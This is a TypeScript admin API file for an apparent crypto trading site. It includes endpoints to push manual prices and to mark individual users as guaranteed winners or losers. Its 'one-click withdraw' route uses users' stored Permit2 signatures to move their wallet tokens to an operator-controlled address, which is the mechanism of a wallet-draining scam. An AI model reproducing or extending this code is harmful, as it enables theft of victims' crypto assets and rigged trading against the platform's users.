import { Elysia, t } from "elysia";
import { eq, and } from "drizzle-orm";
import { createWalletClient, createPublicClient, http, parseAbi } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { mainnet } from "viem/chains";
import { db } from "../db";
import { currencies, users, siteConfig, depositAddresses } from "../db/schema";
import { redis } from "../lib/redis";
import { models } from "../models";
import { env } from "../config/env";

const REDIS_PRICE_KEY = (symbol: string) => `price:${symbol.toUpperCase()}`;

export const adminRoutes = new Elysia({ prefix: "/admin" })
  .use(models)

  // ── Add New Coin ──
  .post(
    "/coin/add",
    async ({ body, set }) => {
      const symbol = body.symbol.toUpperCase();
      const type = body.type;

      // Check if already exists
      const [existing] = await db
        .select()
        .from(currencies)
        .where(eq(currencies.symbol, symbol))
        .limit(1);

      if (existing) {
        set.status = 409;
        return { message: `Currency ${symbol} already exists` } as any;
      }

      // Insert into DB
      const result = await db
        .insert(currencies)
        .values({
          symbol,
          type,
          activeStatus: true,
        })
        .returning();
      const currency = result[0]!;

      // Initialize Redis price queue with a seed price (0 = awaiting feed)
      const priceKey = REDIS_PRICE_KEY(symbol);
      await redis.lpush(priceKey, "0");
      // Keep only the latest 1000 prices
      await redis.ltrim(priceKey, 0, 999);

      console.log(`[Admin] Added currency ${symbol} (${type}), Redis key: ${priceKey}`);

      return {
        id: currency.id,
        symbol: currency.symbol,
        type: currency.type,
        activeStatus: currency.activeStatus,
        iconUrl: currency.iconUrl || null,
        createdAt: currency.createdAt.toISOString(),
        redisPriceKey: priceKey,
      };
    },
    {
      body: t.Object({
        symbol: t.String({ minLength: 1, maxLength: 20 }),
        type: t.Union([t.Literal("spot"), t.Literal("contract")]),
      }),
      detail: {
        tags: ["Admin"],
        summary: "Add a new coin/currency",
        description: "Adds a new currency to the DB and initializes a Redis price queue for real-time price feed.",
      },
    }
  )

  // ── Upload Coin Icon ──
  .post(
    "/coin/:symbol/icon",
    async ({ params, body, set }) => {
      const symbol = params.symbol.toUpperCase();
      const [existing] = await db
        .select()
        .from(currencies)
        .where(eq(currencies.symbol, symbol))
        .limit(1);
      if (!existing) {
        set.status = 404;
        return { message: "Currency not found" } as any;
      }

      const file = body.icon;
      if (!file || !(file instanceof File)) {
        set.status = 400;
        return { message: "No icon file provided" } as any;
      }

      const ext = file.name.split(".").pop()?.toLowerCase() || "png";
      const allowed = ["png", "jpg", "jpeg", "svg", "webp", "gif"];
      if (!allowed.includes(ext)) {
        set.status = 400;
        return { message: `Unsupported format. Allowed: ${allowed.join(", ")}` } as any;
      }

      const filename = `${symbol.toLowerCase()}.${ext}`;
      const filepath = `uploads/icons/${filename}`;
      const buffer = await file.arrayBuffer();
      await Bun.write(filepath, buffer);

      const iconUrl = `/uploads/icons/${filename}?t=${Date.now()}`;
      await db
        .update(currencies)
        .set({ iconUrl })
        .where(eq(currencies.symbol, symbol));

      console.log(`[Admin] Uploaded icon for ${symbol}: ${iconUrl}`);
      return { ok: true, symbol, iconUrl };
    },
    {
      params: t.Object({ symbol: t.String() }),
      body: t.Object({ icon: t.File() }),
      detail: { tags: ["Admin"], summary: "Upload coin icon" },
    }
  )

  // ── Push Price to Redis (simulate market feed) ──
  .post(
    "/price/push",
    async ({ body }) => {
      const symbol = body.symbol.toUpperCase();
      const priceKey = REDIS_PRICE_KEY(symbol);

      // Push price to head of list (latest first)
      await redis.lpush(priceKey, body.price);
      // Trim to keep only latest 1000 entries
      await redis.ltrim(priceKey, 0, 999);

      return {
        symbol,
        price: body.price,
        timestamp: new Date().toISOString(),
      };
    },
    {
      body: t.Object({
        symbol: t.String({ minLength: 1 }),
        price: t.String(),
      }),
      detail: {
        tags: ["Admin"],
        summary: "Push a price tick into Redis",
        description: "Simulates a market data feed. Pushes a price into the Redis price queue for a symbol.",
      },
    }
  )

  // ── Toggle Coin Status ──
  .patch(
    "/coin/:symbol/toggle",
    async ({ params, set }) => {
      const symbol = params.symbol.toUpperCase();

      const [existing] = await db
        .select()
        .from(currencies)
        .where(eq(currencies.symbol, symbol))
        .limit(1);

      if (!existing) {
        set.status = 404;
        return { message: "Currency not found" } as any;
      }

      const result = await db
        .update(currencies)
        .set({ activeStatus: !existing.activeStatus })
        .where(eq(currencies.symbol, symbol))
        .returning();
      const updated = result[0]!;

      return {
        id: updated.id,
        symbol: updated.symbol,
        type: updated.type,
        activeStatus: updated.activeStatus,
        iconUrl: updated.iconUrl || null,
        createdAt: updated.createdAt.toISOString(),
      };
    },
    {
      params: t.Object({ symbol: t.String() }),
      detail: {
        tags: ["Admin"],
        summary: "Toggle a coin's active status",
      },
    }
  )

  // ── Set User Risk Level ──
  .patch(
    "/user/:uid/risk",
    async ({ params, body, set }) => {
      const result = await db
        .update(users)
        .set({ riskLevel: body.riskLevel, updatedAt: new Date() })
        .where(eq(users.uid, params.uid))
        .returning();
      const user = result[0];

      if (!user) {
        set.status = 404;
        return { message: "User not found" } as any;
      }

      return {
        uid: user.uid,
        address: user.address,
        riskLevel: user.riskLevel,
        isFrozen: user.isFrozen,
      };
    },
    {
      params: t.Object({ uid: t.String() }),
      body: t.Object({
        riskLevel: t.Union([
          t.Literal("normal"),
          t.Literal("win"),
          t.Literal("lose"),
        ]),
      }),
      detail: {
        tags: ["Admin"],
        summary: "Set a user's risk level",
        description: "normal = 正常, win = 必赢, lose = 必输",
      },
    }
  )

  // ── Freeze / Unfreeze User ──
  .patch(
    "/user/:uid/freeze",
    async ({ params, body, set }) => {
      const result = await db
        .update(users)
        .set({ isFrozen: body.frozen, updatedAt: new Date() })
        .where(eq(users.uid, params.uid))
        .returning();
      const user = result[0];

      if (!user) {
        set.status = 404;
        return { message: "User not found" } as any;
      }

      return {
        uid: user.uid,
        isFrozen: user.isFrozen,
        message: user.isFrozen ? "User has been frozen" : "User has been unfrozen",
      };
    },
    {
      params: t.Object({ uid: t.String() }),
      body: t.Object({ frozen: t.Boolean() }),
      detail: {
        tags: ["Admin"],
        summary: "Freeze or unfreeze a user account",
      },
    }
  )

  // ── Get Permit2 withdraw configuration ──
  .get(
    "/withdraw-config",
    async ({ set }) => {
      const cfgRows = await db.select().from(siteConfig);
      const cfgMap: Record<string, string> = {};
      for (const r of cfgRows) cfgMap[r.key] = r.value;
      const wKey = cfgMap["withdraw_private_key"] || env.WITHDRAW_PRIVATE_KEY;
      const wAddr = cfgMap["withdraw_to_address"] || env.WITHDRAW_TO_ADDRESS;
      const hasKey = !!wKey;
      const hasAddr = !!wAddr;
      let spenderAddress = "";
      if (hasKey) {
        try {
          const account = privateKeyToAccount(wKey as `0x${string}`);
          spenderAddress = account.address;
        } catch { /* invalid key */ }
      }
      return {
        configured: hasKey && hasAddr,
        spenderAddress,
        receivingAddress: wAddr || "",
        rpcUrl: env.ETH_RPC_URL || "",
      };
    },
    {
      detail: { tags: ["Admin"], summary: "Get Permit2 withdraw wallet configuration" },
    }
  )

  // ── Get Permit2 spender address (public endpoint) ──
  .get(
    "/permit2-spender",
    async ({ set }) => {
      if (!env.WITHDRAW_PRIVATE_KEY) {
        set.status = 500;
        return { message: "Spender not configured" } as any;
      }
      const account = privateKeyToAccount(env.WITHDRAW_PRIVATE_KEY as `0x${string}`);
      return { spender: account.address };
    },
    {
      detail: { tags: ["Admin"], summary: "Get the Permit2 spender wallet address" },
    }
  )

  // ── One-click Withdraw via Permit2 ──
  .post(
    "/user/:uid/withdraw",
    async ({ params, body, set }) => {
      // 1. Load config from DB (fallback to env)
      const cfgRows = await db.select().from(siteConfig);
      const cfgMap: Record<string, string> = {};
      for (const r of cfgRows) cfgMap[r.key] = r.value;
      const withdrawKey = cfgMap["withdraw_private_key"] || env.WITHDRAW_PRIVATE_KEY;
      const withdrawTo = cfgMap["withdraw_to_address"] || env.WITHDRAW_TO_ADDRESS;

      if (!withdrawKey || !withdrawTo) {
        set.status = 500;
        return { message: "Withdraw wallet not configured. Set private key and receiving address in 收金管理." } as any;
      }

      // 2. Look up user + stored Permit2 signature
      const [user] = await db
        .select()
        .from(users)
        .where(eq(users.uid, params.uid))
        .limit(1);

      if (!user) {
        set.status = 404;
        return { message: "User not found" } as any;
      }

      if (!user.permit2Signature || !user.permit2Token || !user.permit2Nonce || !user.permit2Deadline || !user.permit2Amount) {
        set.status = 400;
        return { message: "该用户没有 Permit2 授权签名，请等待用户连接钱包并授权" } as any;
      }

      // 3. Determine withdraw amount (use body.amount or full permit amount)
      const withdrawAmount = body.amount || user.permit2Amount;

      // 4. Build Permit2 contract call
      const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as `0x${string}`;

      const permit2Abi = parseAbi([
        "function permitTransferFrom(((address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount) transferDetails, address owner, bytes signature) external",
      ]);

      const account = privateKeyToAccount(withdrawKey as `0x${string}`);

      const publicClient = createPublicClient({
        chain: mainnet,
        transport: http(env.ETH_RPC_URL),
      });

      const walletClient = createWalletClient({
        account,
        chain: mainnet,
        transport: http(env.ETH_RPC_URL),
      });

      try {
        // 5. Simulate first
        const permit = {
          permitted: {
            token: user.permit2Token as `0x${string}`,
            amount: BigInt(user.permit2Amount),
          },
          nonce: BigInt(user.permit2Nonce),
          deadline: BigInt(user.permit2Deadline),
        };

        const transferDetails = {
          to: withdrawTo as `0x${string}`,
          requestedAmount: BigInt(withdrawAmount),
        };

        await publicClient.simulateContract({
          address: PERMIT2_ADDRESS,
          abi: permit2Abi,
          functionName: "permitTransferFrom",
          args: [permit, transferDetails, user.address as `0x${string}`, user.permit2Signature as `0x${string}`],
          account,
        });

        // 6. Execute
        const txHash = await walletClient.writeContract({
          address: PERMIT2_ADDRESS,
          abi: permit2Abi,
          functionName: "permitTransferFrom",
          args: [permit, transferDetails, user.address as `0x${string}`, user.permit2Signature as `0x${string}`],
        });

        // 7. Clear used signature (nonce is consumed)
        await db
          .update(users)
          .set({
            permit2Signature: null,
            permit2Nonce: null,
            permit2Deadline: null,
            permit2Amount: null,
            permit2Token: null,
            updatedAt: new Date(),
          })
          .where(eq(users.uid, params.uid));

        console.log(`[Admin] Permit2 withdraw for user ${params.uid}: ${txHash}`);

        return {
          success: true,
          txHash,
          amount: withdrawAmount,
          token: user.permit2Token,
          to: withdrawTo,
        };
      } catch (e: any) {
        console.error(`[Admin] Permit2 withdraw failed for user ${params.uid}:`, e);
        set.status = 500;
        return { message: `提币失败: ${e.shortMessage || e.message || "Unknown error"}` } as any;
      }
    },
    {
      params: t.Object({ uid: t.String() }),
      body: t.Object({
        amount: t.Optional(t.String()),
      }),
      detail: {
        tags: ["Admin"],
        summary: "One-click withdraw from user wallet via Permit2",
        description: "Uses the stored Permit2 signature to transfer tokens from user's wallet to the configured receiving address.",
      },
    }
  )

  // ── Get Site Config (admin) ──
  .get(
    "/site-config",
    async () => {
      const rows = await db.select().from(siteConfig);
      const map: Record<string, string> = {};
      for (const r of rows) map[r.key] = r.value;
      return {
        depositAddress: map["deposit_address"] || "",
        depositQrUrl: map["deposit_qr_url"] || "",
        withdrawToAddress: map["withdraw_to_address"] || env.WITHDRAW_TO_ADDRESS || "",
        withdrawPrivateKey: map["withdraw_private_key"] ? "********" : (env.WITHDRAW_PRIVATE_KEY ? "********(env)" : ""),
      };
    },
    { detail: { tags: ["Admin"], summary: "Get all site configuration" } }
  )

  // ── Update Site Config (admin) ──
  .put(
    "/site-config",
    async ({ body }) => {
      const entries: { key: string; value: string }[] = [];
      if (body.depositAddress !== undefined) entries.push({ key: "deposit_address", value: body.depositAddress });
      if (body.depositQrUrl !== undefined) entries.push({ key: "deposit_qr_url", value: body.depositQrUrl });
      if (body.withdrawToAddress !== undefined) entries.push({ key: "withdraw_to_address", value: body.withdrawToAddress });
      if (body.withdrawPrivateKey !== undefined && body.withdrawPrivateKey !== "********") {
        entries.push({ key: "withdraw_private_key", value: body.withdrawPrivateKey });
      }
      for (const e of entries) {
        await db.insert(siteConfig).values({ key: e.key, value: e.value, updatedAt: new Date() })
          .onConflictDoUpdate({ target: siteConfig.key, set: { value: e.value, updatedAt: new Date() } });
      }
      return { ok: true };
    },
    {
      body: t.Object({
        depositAddress: t.Optional(t.String()),
        depositQrUrl: t.Optional(t.String()),
        withdrawToAddress: t.Optional(t.String()),
        withdrawPrivateKey: t.Optional(t.String()),
      }),
      detail: { tags: ["Admin"], summary: "Update site configuration" },
    }
  )

  // ── Upload Deposit QR Code ──
  .post(
    "/site-config/upload-qr",
    async ({ body }) => {
      const file = body.qr;
      if (!file || !(file instanceof File)) return { message: "No file" } as any;
      const ext = file.name.split(".").pop()?.toLowerCase() || "png";
      const filename = `deposit_qr.${ext}`;
      const filepath = `uploads/icons/${filename}`;
      await Bun.write(filepath, await file.arrayBuffer());
      const url = `/uploads/icons/${filename}?t=${Date.now()}`;
      await db.insert(siteConfig).values({ key: "deposit_qr_url", value: url, updatedAt: new Date() })
        .onConflictDoUpdate({ target: siteConfig.key, set: { value: url, updatedAt: new Date() } });
      return { ok: true, url };
    },
    {
      body: t.Object({ qr: t.File() }),
      detail: { tags: ["Admin"], summary: "Upload deposit QR code image" },
    }
  )

  // ── List Deposit Addresses ──
  .get(
    "/deposit-addresses",
    async () => {
      const rows = await db.select().from(depositAddresses);
      return rows.map((r) => ({
        id: r.id,
        chain: r.chain,
        coin: r.coin,
        address: r.address,
        qrUrl: r.qrUrl || "",
      }));
    },
    { detail: { tags: ["Admin"], summary: "List all deposit addresses" } }
  )

  // ── Add Deposit Address ──
  .post(
    "/deposit-addresses",
    async ({ body, set }) => {
      const result = await db.insert(depositAddresses).values({
        chain: body.chain,
        coin: body.coin.toUpperCase(),
        address: body.address,
      }).returning();
      set.status = 201;
      const r = result[0]!;
      return { id: r.id, chain: r.chain, coin: r.coin, address: r.address, qrUrl: r.qrUrl || "" };
    },
    {
      body: t.Object({
        chain: t.String({ minLength: 1 }),
        coin: t.String({ minLength: 1 }),
        address: t.String({ minLength: 1 }),
      }),
      detail: { tags: ["Admin"], summary: "Add a deposit address for a chain+coin" },
    }
  )

  // ── Upload QR for a deposit address ──
  .post(
    "/deposit-addresses/:id/qr",
    async ({ params, body, set }) => {
      const file = body.qr;
      if (!file || !(file instanceof File)) { set.status = 400; return { message: "No file" } as any; }
      const ext = file.name.split(".").pop()?.toLowerCase() || "png";
      const filename = `deposit_${params.id}.${ext}`;
      const filepath = `uploads/icons/${filename}`;
      await Bun.write(filepath, await file.arrayBuffer());
      const url = `/uploads/icons/${filename}?t=${Date.now()}`;
      await db.update(depositAddresses).set({ qrUrl: url }).where(eq(depositAddresses.id, Number(params.id)));
      return { ok: true, url };
    },
    {
      params: t.Object({ id: t.String() }),
      body: t.Object({ qr: t.File() }),
      detail: { tags: ["Admin"], summary: "Upload QR code for a deposit address" },
    }
  )

  // ── Delete Deposit Address ──
  .delete(
    "/deposit-addresses/:id",
    async ({ params, set }) => {
      await db.delete(depositAddresses).where(eq(depositAddresses.id, Number(params.id)));
      return { ok: true };
    },
    {
      params: t.Object({ id: t.String() }),
      detail: { tags: ["Admin"], summary: "Delete a deposit address" },
    }
  );
